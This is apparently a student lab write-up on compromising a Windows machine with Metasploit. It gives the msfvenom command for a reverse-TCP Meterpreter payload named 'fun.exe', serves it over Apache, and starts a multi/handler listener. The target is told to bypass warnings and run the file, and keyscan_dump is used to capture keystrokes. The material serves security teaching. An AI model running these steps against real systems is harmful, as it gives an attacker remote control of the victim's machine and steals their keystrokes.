# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## OUTPUT:

![image](https://github.com/user-attachments/assets/1d451619-2771-413f-99a5-555dea70ebe2)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## Output

![image](https://github.com/user-attachments/assets/32443e42-0f5f-43ae-a265-be0e73598446)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/user-attachments/assets/e3477802-b427-40cf-a904-a517b822fa23)

Start apache server sudo systemctl apache2 start

![image](https://github.com/user-attachments/assets/6f0b2ea4-2d3a-4780-be16-4092777d577d)

Check the status of apache2
![image](https://github.com/user-attachments/assets/09480f89-8df3-4c7d-9f80-5b088b366479)
## Output:

![image](https://github.com/user-attachments/assets/3f36166f-40ac-47f7-8fb2-39f672702749)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
![image](https://github.com/user-attachments/assets/35fd16fa-7aac-4500-b450-ef479fa8af99)

Starting a command and control Server use multi/handler
![image](https://github.com/user-attachments/assets/5c801a2c-fcc1-4609-b9be-706e99ddd221)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.220.129/fun.exe The file "fun.exe" downloads.

![image](https://github.com/user-attachments/assets/52d85a18-6bb2-4130-aee9-506fdba6bf25)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/user-attachments/assets/bd10c68b-19ee-469a-8f1a-91672ff1dfca)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/user-attachments/assets/78cd0fe8-e345-4fe5-a8e1-22e3d6c0d693)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/user-attachments/assets/dd77eead-46d4-4280-b298-433bd3e63fc4)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
